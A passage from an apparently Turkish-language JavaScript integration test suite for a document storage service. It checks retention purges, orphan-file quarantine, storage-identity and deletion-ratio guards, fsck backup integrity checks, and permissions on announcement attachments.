  const renewState = (await q(`SELECT status, created_at > NOW() - INTERVAL '1 minute' AS fresh FROM document_versions WHERE id = $1`, [renewRowId])).rows[0];
  const renewPut = renewed?.body?.upload ? await rawPut(renewed.body.upload.path, MGR, renewBytes) : null;
  check('I1e (R16 P1-1): bakimin secimi ile DELETE arasinda bekleyen surum YENILENIRSE satir silinmez (sure kosulu DELETE\'te tekrar sinanir); yenilenen yukleme tanimina yukleme 200',
    renewMaint.summary.errors === 0 && renewFirst.status === 201 && renewed?.status === 201 && renewState?.status === 'uploading' && renewState.fresh === true && renewPut?.status === 200, { renewState, renewed: renewed?.status, put: renewPut?.status });
  // saklama suresi
  const retDoc = await publish(MGR, {}, PDF, maint.code);
  const retKey = (await q(`SELECT storage_key FROM document_versions WHERE document_id = $1`, [retDoc.id])).rows[0].storage_key;
  const retFresh = await publish(MGR, {}, PDF, maint.code);
  await call('DELETE', `${mBase}/${retDoc.id}`, MGR, {});
  await call('DELETE', `${mBase}/${retFresh.id}`, MGR, {});
  await q(`UPDATE documents SET deleted_at = NOW() - INTERVAL '31 days' WHERE id = $1`, [retDoc.id]);
  const m2 = await runDocumentsMaintenanceOnce();
  check('I2: saklama suresi (30 gun) dolan silinmis belge KALICI silinir (dosya + satir + audit actor Sistem auto:true); suresi dolmayan korunur', (await countOf(`SELECT COUNT(*)::int AS n FROM documents WHERE id = $1`, [retDoc.id])) === 0 && !(await diskFiles(maint.code)).includes(retKey.split('/')[1]) && (await countOf(`SELECT COUNT(*)::int AS n FROM documents WHERE id = $1`, [retFresh.id])) === 1 && m2.summary.purged_documents === 1 && (await countOf(`SELECT COUNT(*)::int AS n FROM audit_log WHERE action = 'document.purged' AND target_id = $1 AND actor_name = 'Sistem' AND (details->>'auto')::boolean`, [String(retDoc.id)])) === 1, m2);
  // unlink hatasi: dosya COMMIT'ten SONRA silinir (R11 F7); silinemezse satir gitmistir, dosya yetim kalir
  const stuckDoc = await publish(MGR, {}, PDF, maint.code);
  const stuckKey = (await q(`SELECT storage_key FROM document_versions WHERE document_id = $1`, [stuckDoc.id])).rows[0].storage_key;
  await call('DELETE', `${mBase}/${stuckDoc.id}`, MGR, {});
  await q(`UPDATE documents SET deleted_at = NOW() - INTERVAL '40 days' WHERE id = $1`, [stuckDoc.id]);
  const stuckPath = pathForKey(storageRoot, stuckKey);
  await fsp.unlink(stuckPath);
  await fsp.mkdir(stuckPath); // dosya yerine dizin: unlink EPERM / EISDIR -> COMMIT sonrasi silme basarisiz
  const m3 = await runDocumentsMaintenanceOnce();
  const stuckGone = await countOf(`SELECT COUNT(*)::int AS n FROM documents WHERE id = $1`, [stuckDoc.id]);
  const stuckStillOnDisk = fsSync.existsSync(stuckPath);
  await fsp.rmdir(stuckPath);
  check('I3 (R11 F7): dosya silinemezse (dosya yerine dizin) satir COMMIT ile gider (purged sayilir), dosya yetim kalir, hata SAYILIR, sunucu dusmez', stuckGone === 0 && stuckStillOnDisk && m3.summary.purged_documents === 1 && m3.summary.errors >= 1, { m3: m3.summary });

  // R11 F7: COMMIT basarisiz olursa dosya SILINMEZ (ready surum dosyasiz kalmasin)
  const commitDoc = await publish(MGR, {}, PDF, maint.code);
  const commitKey = (await q(`SELECT storage_key FROM document_versions WHERE document_id = $1`, [commitDoc.id])).rows[0].storage_key;
  await call('DELETE', `${mBase}/${commitDoc.id}`, MGR, {});
  hooks.failOnce = { match: /^COMMIT$/, code: '57P01', times: 1 };
  const purgeFailed = await call('POST', `${mBase}/${commitDoc.id}/purge`, MGR, { confirm: true });
  hooks.failOnce = null;
  const purgeFailedState = {
    fileKept: fsSync.existsSync(pathForKey(storageRoot, commitKey)),
    rowKept: await countOf(`SELECT COUNT(*)::int AS n FROM documents WHERE id = $1 AND status = 'deleted'`, [commitDoc.id]),
  };
  const purgeRetry = await call('POST', `${mBase}/${commitDoc.id}/purge`, MGR, { confirm: true });
  check('I3b (R11 F7): kalici silmede COMMIT basarisiz -> istek hata verir, DOSYA YERINDE ve satir KALIR (ready surum dosyasiz kalmaz); yeniden denemede dosya + satir gider',
    purgeFailed.status >= 500 && purgeFailedState.fileKept && purgeFailedState.rowKept === 1 && purgeRetry.status === 200 && !fsSync.existsSync(pathForKey(storageRoot, commitKey)) && (await countOf(`SELECT COUNT(*)::int AS n FROM documents WHERE id = $1`, [commitDoc.id])) === 0, { failed: purgeFailed.status, purgeFailedState, retry: purgeRetry.status });

  const verDoc = await publish(MGR, {}, PDF, maint.code);
  const v2Bytes = markerPdf('F7-SURUM-2-CCCC');
  const v2Created = await call('POST', `${mBase}/${verDoc.id}/versions`, MGR, { file: { name: 'v2.pdf', size: v2Bytes.length } });
  await rawPut(v2Created.body.upload.path, MGR, v2Bytes);
  const v2Key = (await q(`SELECT storage_key FROM document_versions WHERE document_id = $1 AND version_no = 2`, [verDoc.id])).rows[0].storage_key;
  hooks.failOnce = { match: /^COMMIT$/, code: '57P01', times: 1 };
  const verFailed = await call('DELETE', `${mBase}/${verDoc.id}/versions/2`, MGR);
  hooks.failOnce = null;
  const v2Still = await call('GET', `${mBase}/${verDoc.id}/download?version=2`, MGR);
  const verRetry = await call('DELETE', `${mBase}/${verDoc.id}/versions/2`, MGR);
  check('I3c (R11 F7): surum silmede COMMIT basarisiz -> dosya yerinde, `ready` surum satiri durur ve INDIRILEBILIR (200); yeniden denemede dosya + satir gider',
    verFailed.status >= 500 && v2Still.status === 200 && Buffer.compare(v2Still.raw, v2Bytes) === 0 && verRetry.status === 200 && !fsSync.existsSync(pathForKey(storageRoot, v2Key)) && (await countOf(`SELECT COUNT(*)::int AS n FROM document_versions WHERE document_id = $1 AND version_no = 2`, [verDoc.id])) === 0, { failed: verFailed.status, still: v2Still.status, retry: verRetry.status });
  // yetim dosya sup.
  const orphanDir = path.join(storageRoot, 'sites', String(maint.code));
  const orphanNames = Array.from({ length: 205 }, () => crypto.randomUUID());
  const old = new Date(Date.now() - 30 * 3600_000);
  for (const name of orphanNames) {
    await fsp.writeFile(path.join(orphanDir, name), 'yetim');
    await fsp.utimes(path.join(orphanDir, name), old, old);
  }
  const youngOrphan = crypto.randomUUID();
  await fsp.writeFile(path.join(orphanDir, youngOrphan), 'genc yetim');
  // R9 F3: 400 adet 3 gunluk GIDER BELGESI dosyasi (yalniz expense_documents satiri var): yetim sayilmamali; ayni zamanda oran korumasinin altinda kalmamizi saglar
  const expenseKeys = await seedExpenseDocs(maint.code, 400);
  const knownBefore = await diskFiles(maint.code);
  const o1 = await runDocumentsMaintenanceOnce();
  const afterO1 = await diskFiles(maint.code);
  const remainingOld = orphanNames.filter((n) => afterO1.includes(n)).length;
  check(`I4: yetim dosya supurmesi (SILMEZ: _orphans karantinasina tasir) tur basina <= 200 (silinen ${o1.summary.orphan_files}, kalan eski yetim ${remainingOld}); 24 saatten GENC yetim, DB'de kayitli dosyalar ve 400 gider belgesi (expense_documents) dosyasi KORUNUR`, o1.summary.orphan_files === 200 && remainingOld === 5 && (await fsp.readdir(path.join(storageRoot, '_orphans', String(maint.code)))).length === 200 && afterO1.includes(youngOrphan) && o1.summary.guard_trips === 0 && expenseKeys.every((key) => afterO1.includes(key.split('/')[1])) && knownBefore.filter((n) => !orphanNames.includes(n) && n !== youngOrphan).every((n) => afterO1.includes(n)), { o1: o1.summary, remainingOld });
  const o2 = await runDocumentsMaintenanceOnce();
  check('I4b: ikinci tur kalan 5 yetimi de siler', o2.summary.orphan_files === 5 && orphanNames.every((n) => !fsSync.existsSync(path.join(orphanDir, n))) && fsSync.existsSync(path.join(orphanDir, youngOrphan)));
  const expenseKeySet = new Set(expenseKeys);
  const fsckExpense = await runFsck({ root: storageRoot });
  const fsckExpenseFix = await runFsck({ root: storageRoot, fixOrphans: true });
  check('I4c (R9 F3): fsck gider belgesi (expense_documents) dosyalarini DENETLER (400) ve YETIM saymaz; --fix-orphans onlara dokunmaz; eksik / boyut uyusmazligi yok', fsckExpense.expense_documents_checked === 400 && !fsckExpense.orphans.some((entry) => expenseKeySet.has(entry.storage_key)) && fsckExpense.missing.filter((entry) => expenseKeySet.has(entry.storage_key)).length === 0 && fsckExpense.size_mismatch.filter((entry) => expenseKeySet.has(entry.storage_key)).length === 0 && expenseKeys.every((key) => fsSync.existsSync(path.join(storageRoot, 'sites', key))) && fsckExpenseFix.guard_tripped === false, { checked: fsckExpense.expense_documents_checked, orphans: fsckExpense.orphans.length });
  await dropExpenseDocs(expenseKeys);
  const f8Keys = await seedExpenseDocs(maint.code, 1, 25 * 3600_000);
  const f8Run = await runDocumentsMaintenanceOnce();
  check('I4d (R11 F8): HAZIR gider belgesi + 25 saatlik dosya yetim supurmesinde SILINMEZ (document_versions kaydi olmadan, gider dikisi bagli olmasa bile)', fsSync.existsSync(path.join(storageRoot, 'sites', f8Keys[0])) && f8Run.summary.guard_trips === 0, { f8: f8Run.summary });
  await dropExpenseDocs(f8Keys);

  // --- R16 P2-4: yetim KARANTINASI (aynı DB'nin ESKI dokumu geri yuklendi: satiri kaybolmus ama dosyasi duran belge)
  const quarantineRoot = path.join(storageRoot, '_orphans', String(maint.code));
  const quarantineBytes = markerPdf('KARANTINA-BELGE-A');
  const qDoc = await publish(MGR, {}, quarantineBytes, maint.code);
  const qKey = (await q(`SELECT storage_key FROM document_versions WHERE document_id = $1`, [qDoc.id])).rows[0].storage_key;
  const qSnapshot = {
    doc: (await q(`SELECT to_jsonb(d) AS j FROM documents d WHERE id = $1`, [qDoc.id])).rows[0].j,
    version: (await q(`SELECT to_jsonb(v) AS j FROM document_versions v WHERE document_id = $1`, [qDoc.id])).rows[0].j,
  };
  const qFile = pathForKey(storageRoot, qKey);
  const qOld = new Date(Date.now() - 2 * 86400_000);
  await fsp.utimes(qFile, qOld, qOld);
  await q(`DELETE FROM documents WHERE id = $1`, [qDoc.id]); // "eski dokumde bu belge yok"
  const qMaint = await runDocumentsMaintenanceOnce();
  const qUuid = qKey.split('/')[1];
  const quarantinedOk = fsSync.existsSync(path.join(quarantineRoot, qUuid)) && !fsSync.existsSync(qFile) && (await fsp.readFile(path.join(quarantineRoot, qUuid))).equals(quarantineBytes);
  check('I4e (R16 P2-4): satiri kaybolmus (eski DB dokumu) ama dosyasi duran belge bakim turunda SILINMEZ: _orphans/<site>/<uuid> karantinasina tasinir, icerik ayni', qMaint.summary.orphan_files === 1 && quarantinedOk && qMaint.summary.guard_trips === 0, qMaint.summary);
  await q(`INSERT INTO documents SELECT (jsonb_populate_record(NULL::documents, $1::jsonb)).*`, [JSON.stringify(qSnapshot.doc)]); // daha yeni dokum / kayit geri geldi
  await q(`INSERT INTO document_versions SELECT (jsonb_populate_record(NULL::document_versions, $1::jsonb)).*`, [JSON.stringify(qSnapshot.version)]);
  const qReport = await runFsck({ root: storageRoot });
  const qRestore = await runFsck({ root: storageRoot, restoreQuarantine: true });
  const qAfter = await runFsck({ root: storageRoot });
  const qDownload = await call('GET', `${mBase}/${qDoc.id}/download`, MGR);
  check('I4f (R16 P2-4): fsck --report karantinayi gosterir (eksik dosya in_quarantine, geri alinabilir); --restore-quarantine dosyayi yerine koyar; sonra fsck eksik yok, indirme 200',
    qReport.missing.some((entry) => entry.storage_key === qKey && entry.in_quarantine === true) && qReport.quarantine.files >= 1 && qReport.quarantine.restorable.includes(qKey) && qRestore.quarantine.restored >= 1 && fsSync.existsSync(qFile) && !qAfter.missing.some((entry) => entry.storage_key === qKey) && qDownload.status === 200 && Buffer.compare(qDownload.raw, quarantineBytes) === 0,
    { report: qReport.quarantine, restored: qRestore.quarantine.restored, after: qAfter.missing.length, download: qDownload.status });

  // karantina suresi dolunca silinir (varsayilan 14 gun), dolmayan kalir
  const qExpired = crypto.randomUUID();
  const qRecent = crypto.randomUUID();
  await fsp.mkdir(quarantineRoot, { recursive: true });
  await fsp.writeFile(path.join(quarantineRoot, qExpired), 'eski');
  await fsp.writeFile(path.join(quarantineRoot, qRecent), 'yeni');
  await fsp.utimes(path.join(quarantineRoot, qExpired), new Date(Date.now() - 15 * 86400_000), new Date(Date.now() - 15 * 86400_000));
  await fsp.utimes(path.join(quarantineRoot, qRecent), new Date(Date.now() - 5 * 86400_000), new Date(Date.now() - 5 * 86400_000));
  const qPurge = await runDocumentsMaintenanceOnce();
  check('I4g (R16 P2-4): karantina dosyasi 14 gunu dolunca bakim turunda silinir (quarantine_purged), dolmayan kalir', qPurge.summary.quarantine_purged >= 1 && !fsSync.existsSync(path.join(quarantineRoot, qExpired)) && fsSync.existsSync(path.join(quarantineRoot, qRecent)), qPurge.summary);
  await fsp.rm(path.join(quarantineRoot, qRecent), { force: true });
  // DB yokken silme
  const dbOrphan = crypto.randomUUID();
  await fsp.writeFile(path.join(orphanDir, dbOrphan), 'yetim');
  await fsp.utimes(path.join(orphanDir, dbOrphan), old, old);
  hooks.failOnce = { match: /storage_key = ANY/, code: '57P01', times: 50 };
  const o3 = await runDocumentsMaintenanceOnce();
  hooks.failOnce = null;
  check('I5: yetim kontrolu icin DB sorgusu BASARISIZSA HICBIR dosya silinmez (hata sayilir, sunucu dusmez)', fsSync.existsSync(path.join(orphanDir, dbOrphan)) && o3.summary.errors >= 1 && o3.summary.orphan_files === 0, o3.summary);
  // tek calisan
  const blocker = await pool.connect();
  await blocker.query('SELECT pg_advisory_lock($1::int, $2::int)', MAINTENANCE_LOCK);
  const busy = await runDocumentsMaintenanceOnce();
  await blocker.query('SELECT pg_advisory_unlock($1::int, $2::int)', MAINTENANCE_LOCK);
  blocker.release();
  const free = await runDocumentsMaintenanceOnce();
  check('I6: sureclar arasi TEK calisan: kilit baska oturumdaysa tur atlanir (busy); kilit birakilinca calisir', busy.skipped === true && busy.reason === 'busy' && free.skipped === false);
  // silinmis site dizini
  const ghostCode = 1999999999;
  const ghostDir = path.join(storageRoot, 'sites', String(ghostCode));
  await fsp.mkdir(ghostDir, { recursive: true });
  await fsp.writeFile(path.join(ghostDir, crypto.randomUUID()), 'x');
  const recentGhost = 1999999998;
  const recentDir = path.join(storageRoot, 'sites', String(recentGhost));
  await fsp.mkdir(recentDir, { recursive: true });
  const eightDays = new Date(Date.now() - 8 * 86400_000);
  for (const entry of await fsp.readdir(ghostDir)) await fsp.utimes(path.join(ghostDir, entry), eightDays, eightDays);
  await fsp.utimes(ghostDir, eightDays, eightDays);
  const m7 = await runDocumentsMaintenanceOnce();
  check('I7: silinmis siteye ait dizin (icindeki her sey 7 gunden eski, kaydi yok) tek turda kaldirilir; yeni olan dizin korunur; yetim supurmesi silinmis sitenin dizinine DOKUNMAZ (R9 F4)', !fsSync.existsSync(ghostDir) && fsSync.existsSync(recentDir) && m7.summary.site_dirs === 1 && m7.summary.guard_trips === 0, m7.summary);
  await fsp.rm(recentDir, { recursive: true, force: true });

  // --- R9 F4: depolama kimligi + oran korumalari (GERCEK PG + gercek dosya sistemi)
  console.log('--- I+. depolama kimligi ve oran korumalari ---');
  const identityPath = path.join(storageRoot, '.instance');
  const goodIdentity = (await fsp.readFile(identityPath, 'utf8')).trim();
  const ageFile = async (file, ms) => {
    const when = new Date(Date.now() - ms);
    await fsp.utimes(file, when, when);
  };
  const plantOrphans = async (count, ageMs = 30 * 3600_000) => {
    const names = [];
    for (let i = 0; i < count; i += 1) {
      const name = crypto.randomUUID();
      await fsp.writeFile(path.join(orphanDir, name), 'yetim');
      await ageFile(path.join(orphanDir, name), ageMs);
      names.push(name);
    }
    return names;
  };
  const allExist = (names) => names.every((name) => fsSync.existsSync(path.join(orphanDir, name)));
  const noneExist = (names) => names.every((name) => !fsSync.existsSync(path.join(orphanDir, name)));
  const plantGhost = async (code) => {
    const dir = path.join(storageRoot, 'sites', String(code));
    await fsp.mkdir(dir, { recursive: true });
    const file = path.join(dir, crypto.randomUUID());
    await fsp.writeFile(file, 'x');
    await ageFile(file, 8 * 86400_000);
    await ageFile(dir, 8 * 86400_000);
    return dir;
  };

  // I8: dizin kimligi DB ile UYUSMUYOR (baska dizin / baska DB)
  await expirePending();
  const f4Orphans = await plantOrphans(3);
  const f4Ghost = await plantGhost(1999999991);
  const f4Stale = await call('POST', mBase, MGR, newDoc({}, PDF));
  await q(`UPDATE document_versions SET created_at = NOW() - INTERVAL '3 hours' WHERE document_id = $1`, [f4Stale.body.document.id]);
  await q(`UPDATE documents SET created_at = NOW() - INTERVAL '3 hours' WHERE id = $1`, [f4Stale.body.document.id]);
  await fsp.writeFile(identityPath, `${crypto.randomUUID()}\n`);
  const errorsBefore = serverErrors.length;
  const f4a = await runDocumentsMaintenanceOnce();
  check('I8 (R9 F4): .instance DB ile UYUSMUYORSA yetim dosya ve silinmis site dizini SILINMEZ (identity_blocked=1); DB\'den-gelen tur (bayat yukleme) calismaya devam eder; ERROR gunlugunde durum=mismatch, kimlik DEGERI yok',
    f4a.summary.identity_blocked === 1 && f4a.summary.orphan_files === 0 && f4a.summary.site_dirs === 0 && allExist(f4Orphans) && fsSync.existsSync(f4Ghost) && f4a.summary.stale_uploads >= 1 && (await countOf(`SELECT COUNT(*)::int AS n FROM documents WHERE id = $1`, [f4Stale.body.document.id])) === 0 && serverErrors.slice(errorsBefore).some((line) => /DOGRULANAMADI \(durum=mismatch\)/.test(line)) && !serverErrors.join('\n').includes(goodIdentity), f4a.summary);
  await fsp.writeFile(identityPath, `${goodIdentity}\n`);
  const f4b = await runDocumentsMaintenanceOnce();
  check('I8b: kimlik duzelince ayni bakim yetimleri ve silinmis site dizinini siler', f4b.summary.identity_blocked === 0 && noneExist(f4Orphans) && !fsSync.existsSync(f4Ghost) && f4b.summary.site_dirs === 1, f4b.summary);

  // I9: DB'de kimlik YOK (bos / yanlis / eski DB) + dizinde dosyalar
  const f4Orphans2 = await plantOrphans(2);
  await q(`DELETE FROM platform_settings WHERE key = 'documents.storage_id'`);
  const f4c = await runDocumentsMaintenanceOnce();
  const fsckRefused = await runFsck({ root: storageRoot, fixOrphans: true });
  const fsckRefusedForce = await runFsck({ root: storageRoot, fixOrphans: true, force: true });
  check('I9 (R9 F4): DB\'de kimlik YOKKEN (bos / yanlis / eski DB) bakim ve fsck --fix-orphans (--force dahil) HICBIR sey silmez; durum db_identity_missing; fsck cikis kodu 1', f4c.summary.identity_blocked === 1 && allExist(f4Orphans2) && fsckRefused.guard_tripped === true && fsckRefused.identity?.state === 'db_identity_missing' && fsckRefused.orphans_removed === 0 && fsckRefusedForce.orphans_removed === 0 && fsckRefused.exit_code === 1, { f4c: f4c.summary, identity: fsckRefused.identity });
  const fsckAdopt = await runFsck({ root: storageRoot, adoptStorageId: true, fixOrphans: true });
  const identityAfter = (await q(`SELECT value FROM platform_settings WHERE key = 'documents.storage_id'`)).rows[0]?.value;
  check('I9b: fsck --adopt-storage-id dizin kimligini DB\'ye yazar (adopted_db); ayni calistirmadaki --fix-orphans artik yetimleri siler', fsckAdopt.identity?.adopted === 'adopted_db' && fsckAdopt.identity?.ok === true && identityAfter?.id === goodIdentity && fsckAdopt.orphans_removed >= 2 && noneExist(f4Orphans2), { identity: fsckAdopt.identity, removed: fsckAdopt.orphans_removed });

  // I10: yetim ORAN korumasi (taranan eski dosyalarin tamami yetim gorunuyor)
  const bulkOrphans = await plantOrphans(25);
  const errorsBefore10 = serverErrors.length;
  const f4d = await runDocumentsMaintenanceOnce();
  const fsckGuard = await runFsck({ root: storageRoot, fixOrphans: true });
  check('I10 (R9 F4): ORAN KORUMASI: 25 eski yetim = taranan eski dosyalarin %100\'u -> bakim ve fsck SILMEZ (guard_trips / guard_tripped); ERROR gunlugunde ORAN KORUMASI satiri', f4d.summary.guard_trips === 1 && f4d.summary.orphan_files === 0 && allExist(bulkOrphans) && fsckGuard.guard_tripped === true && fsckGuard.orphans_removed === 0 && fsckGuard.exit_code === 1 && serverErrors.slice(errorsBefore10).some((line) => /ORAN KORUMASI: \d+\/\d+ eski dosya yetim/.test(line)), { f4d: f4d.summary, guard: fsckGuard.guard_tripped });
  const fsckForce = await runFsck({ root: storageRoot, fixOrphans: true, force: true });
  check('I10b: fsck --force YALNIZ oran korumasini asar (kimlik eslesiyor): 25 yetim silinir', fsckForce.orphans_removed >= 25 && noneExist(bulkOrphans), { removed: fsckForce.orphans_removed });

  // I11: silinmis site dizini ORAN korumasi
  const ghostDirs = [];
  for (let i = 0; i < 40; i += 1) ghostDirs.push(await plantGhost(1999990000 + i));
  const f4e = await runDocumentsMaintenanceOnce();
  check('I11 (R9 F4): 40 site dizini silinmis gorunurken (tum dizinlerin > %50\'si) HICBIRI silinmez (guard_trips=1)', f4e.summary.guard_trips === 1 && f4e.summary.site_dirs === 0 && ghostDirs.every((dir) => fsSync.existsSync(dir)), f4e.summary);
  for (const dir of ghostDirs.slice(1)) await fsp.rm(dir, { recursive: true, force: true });
  const f4f = await runDocumentsMaintenanceOnce();
  check('I11b: tek silinmis site dizini (olagan durum: bir site silindi) korumaya TAKILMAZ ve kaldirilir', f4f.summary.site_dirs === 1 && f4f.summary.guard_trips === 0 && !fsSync.existsSync(ghostDirs[0]), f4f.summary);

  // ============================================================================================================
  // J. Yedek / geri yukleme ve bütünlük (documents_fsck)
  // ============================================================================================================
  console.log('--- J. yedek ve fsck ---');
  await fsp.rm(path.join(orphanDir, youngOrphan), { force: true });
  await fsp.rm(path.join(orphanDir, dbOrphan), { force: true });
  const backupRoot = fsSync.mkdtempSync(path.join(os.tmpdir(), 'qa-documents-backup-'));
  await fsp.cp(storageRoot, backupRoot, { recursive: true });
  const fsckClean = await runFsck({ root: backupRoot });
  check(`J1: DB + dizin kopyasi (yedekten geri yukleme) fsck TEMIZ: eksik 0, boyut uyusmazligi 0, yetim 0 (denetlenen ${fsckClean.versions_checked} surum)`, fsckClean.missing.length === 0 && fsckClean.size_mismatch.length === 0 && fsckClean.orphans.length === 0 && fsckClean.exit_code === 0, { ...fsckClean, versions_checked: undefined });
  const hashRun = await runFsck({ root: backupRoot, verifyHash: true, limit: 5 });
  check('J2: --verify-hash --limit 5: 5 dosya dogrulanir, uyusmazlik yok', hashRun.hash_verified === 5 && hashRun.hash_mismatch.length === 0);
  const victim = (await q(`SELECT storage_key, document_id FROM document_versions WHERE status = 'ready' ORDER BY id DESC LIMIT 2`)).rows;
  await fsp.writeFile(pathForKey(backupRoot, victim[0].storage_key), Buffer.alloc(10, 1));
  await fsp.unlink(pathForKey(backupRoot, victim[1].storage_key));
  const fsckBroken = await runFsck({ root: backupRoot });
  check('J3: dosya silinince EKSIK (kritik) + boyutu degisince BOYUT UYUSMAZLIGI raporlanir; cikis kodu 2', fsckBroken.missing.some((m) => m.storage_key === victim[1].storage_key) && fsckBroken.size_mismatch.some((m) => m.storage_key === victim[0].storage_key) && fsckBroken.exit_code === 2);
  const sameSize = (await q(`SELECT storage_key, size_bytes FROM document_versions WHERE status = 'ready' ORDER BY id LIMIT 1`)).rows[0];
  await fsp.writeFile(pathForKey(backupRoot, sameSize.storage_key), Buffer.alloc(Number(sameSize.size_bytes), 7));
  const hashBroken = await runFsck({ root: backupRoot, verifyHash: true });
  check('J4: ayni boyutta ama FARKLI icerik --verify-hash ile yakalanir', hashBroken.hash_mismatch.some((m) => m.storage_key === sameSize.storage_key));
  await fsp.writeFile(path.join(backupRoot, 'sites', String(maint.code), crypto.randomUUID()), 'yetim');
  const oldOrphanFile = path.join(backupRoot, 'sites', String(maint.code), crypto.randomUUID());
  await fsp.writeFile(oldOrphanFile, 'eski yetim');
  await fsp.utimes(oldOrphanFile, old, old);
  const fixRun = await runFsck({ root: backupRoot, fixOrphans: true });
  check('J5: --fix-orphans yalniz 24 saatten ESKI yetimi siler; genc yetim kalir (cikis 1 ya da 2)', fixRun.orphans_removed === 1 && !fsSync.existsSync(oldOrphanFile) && fixRun.orphans.length === 2);
  // canli sistemde dosya kaybi: indirme 500 DOCUMENT_FILE_MISSING + errorId
  const lostDoc = await publish(MGR, { audience: 'residents', title: 'Kaybolacak' }, PDF, vis.code);
  const lostKey = (await q(`SELECT storage_key FROM document_versions WHERE document_id = $1`, [lostDoc.id])).rows[0].storage_key;
  await fsp.unlink(pathForKey(storageRoot, lostKey));
  const lostMgr = await call('GET', vBase(`/${lostDoc.id}/download`), MGR);
  const lostRes = await call('GET', `/app/documents/${lostDoc.id}/download`, R2.user);
  check('J6: DB satiri var ama dosya yok: yonetici ve sakin indirmesi 500 DOCUMENT_FILE_MISSING + errorId (butunluk alarmi, ERROR gunlugu)', lostMgr.status === 500 && lostMgr.body.code === 'DOCUMENT_FILE_MISSING' && /^[0-9a-f]{12}$/.test(lostMgr.body.errorId) && lostRes.status === 500 && serverErrors.some((l) => /DOSYA KAYIP/.test(l)));
  await fsp.rm(backupRoot, { recursive: true, force: true });

  // ============================================================================================================
  // K. Duyuru eki
  // ============================================================================================================
  console.log('--- K. duyuru eki ---');
  const aBase = `/manager/sites/${vis.code}/announcements`;
  const attDocA = await vdoc({ audience: 'residents', title: 'Ek Belgesi A', file: { name: 'ek-a.pdf', size: PDF.length } });
  const attDocB = await vdoc({ audience: 'residents', title: 'Ek Belgesi B', file: { name: 'ek-b.pdf', size: PDF.length } });
  const attManagers = await vdoc({ audience: 'managers', title: 'Ek Yonetici' });
  const otherSiteAtt = await publish(MGR2, { audience: 'residents' }, PDF, site2.code);
  const annBody = (over = {}) => ({ title: 'Ekli duyuru', body: 'Ekleri uygulamadan goruntuleyin.', importance: 'normal', target: { type: 'site' }, send_email: false, publish: 'draft', ...over });
  const annRejected = [
    await call('POST', aBase, MGR, annBody({ document_ids: [attManagers] })),
    await call('POST', aBase, MGR, annBody({ document_ids: [otherSiteAtt.id] })),
    await call('POST', aBase, MGR, annBody({ document_ids: [99999999] })),
    await call('POST', aBase, MGR, annBody({ document_ids: [1, 2, 3, 4, 5, 6] })),
    await call('POST', aBase, MGR, annBody({ document_ids: ['x'] })),
  ];
  check('K1: eklenemeyen belgeler: yonetici belgesi / baska site / olmayan = 409 ATTACHMENT_NOT_ALLOWED; > 5 ve gecersiz kimlik 400; reddedilen istekte duyuru TASLAGI da olusmaz', annRejected.slice(0, 3).every((r) => r.status === 409 && r.body.code === 'ATTACHMENT_NOT_ALLOWED') && annRejected[3].status === 400 && annRejected[4].status === 400 && (await countOf(`SELECT COUNT(*)::int AS n FROM announcements WHERE site_code = $1 AND title = 'Ekli duyuru'`, [vis.code])) === 0, annRejected.map((r) => [r.status, r.body?.code]));
  const draftAnn = await call('POST', aBase, MGR, annBody({ document_ids: [attDocA] }));
  check('K2: taslak duyuruya ek: 201, attachments [{ document_id, title, file_name, mime_type, size_bytes, available: true }], attachment_count 1; audit document.attached', draftAnn.status === 201 && draftAnn.body.attachment_count === 1 && same(Object.keys(draftAnn.body.attachments[0]), ['document_id', 'title', 'file_name', 'mime_type', 'size_bytes', 'available']) && draftAnn.body.attachments[0].available === true && (await countOf(`SELECT COUNT(*)::int AS n FROM audit_log WHERE action = 'document.attached' AND target_id = $1`, [String(attDocA)])) === 1, draftAnn.body);
  const annId = draftAnn.body.id;
  const replaced = await call('PATCH', `${aBase}/${annId}`, MGR, { document_ids: [attDocB, attDocA] });
  check('K3: PATCH document_ids listeyi DEGISTIRIR (sira korunur: B, A); bos dizi tumunu kaldirir; audit detached', replaced.status === 200 && same(replaced.body.attachments.map((a) => a.document_id), [attDocB, attDocA]));
  const cleared = await call('PATCH', `${aBase}/${annId}`, MGR, { document_ids: [] });
  const restoredAtt = await call('PATCH', `${aBase}/${annId}`, MGR, { document_ids: [attDocA] });
  check('K3b: bos dizi tumunu kaldirir; yeniden eklenebilir; ek sayilari listede gorunur', cleared.body.attachment_count === 0 && restoredAtt.body.attachment_count === 1 && (await call('GET', aBase, MGR)).body.items.find((i) => i.id === annId).attachment_count === 1);
  const published = await call('POST', `${aBase}/${annId}/publish`, MGR);
  check('K4: yayin: duyuru published; yayindan sonra document_ids PATCH 409 INVALID_STATE (ek listesi degismez)', published.status === 200 && published.body.status === 'published' && (await call('PATCH', `${aBase}/${annId}`, MGR, { document_ids: [] })).status === 409 && (await call('PATCH', `${aBase}/${annId}`, MGR, { document_ids: [] })).body.code === 'INVALID_STATE');
  const inboxR2 = await call('GET', '/app/announcements', R2.user);
  const inboxItem = inboxR2.body.items.find((i) => i.id === annId);
  const detailAnn = await call('GET', `/app/announcements/${annId}`, R2.user);
  check('K5: alici sakin gelen kutusunda ve ayrintida ekleri gorur (available true)', inboxItem && inboxItem.attachments.length === 1 && inboxItem.attachments[0].document_id === attDocA && detailAnn.body.attachments[0].available === true, inboxItem);
  const attUrl = `/app/announcements/${annId}/attachments/${attDocA}/download`;
  const dlAtt = await call('GET', attUrl, R2.user);
  check('K6: ek indirme: alici 200 (belgenin KENDI hedefi dar olsa da; duyuru alicisi yeter) + tum basliklar; alici OLMAYAN 404; ekli olmayan belge 404', dlAtt.status === 200 && Buffer.compare(dlAtt.raw, PDF) === 0 && dlAtt.headers.get('x-content-type-options') === 'nosniff' && (await call('GET', attUrl, OUTSIDER)).status === 404 && (await call('GET', attUrl, R3user)).status === 404 && (await call('GET', `/app/announcements/${annId}/attachments/${attDocB}/download`, R2.user)).status === 404);
  await call('PATCH', vBase(`/${attDocA}`), MGR, { audience: 'residents', target: { type: 'apartments', apartment_ids: [A1.id] } });
  check('K6b: belgenin kendi hedefi daraltilsa bile duyuru alicisi eki indirir (sozlesme: belge hedefine bakilmaz)', (await call('GET', attUrl, R2.user)).status === 200);
  const inUse = await call('DELETE', vBase(`/${attDocA}`), MGR, {});
  check('K7: yayindaki duyuruya ekli belge onaysiz silinemez: 409 DOCUMENT_IN_USE + attachments_count; kitle residents disina cekmek de onay ister', inUse.status === 409 && inUse.body.code === 'DOCUMENT_IN_USE' && inUse.body.attachments_count === 1 && (await call('PATCH', vBase(`/${attDocA}`), MGR, { audience: 'board' })).body.code === 'DOCUMENT_IN_USE');
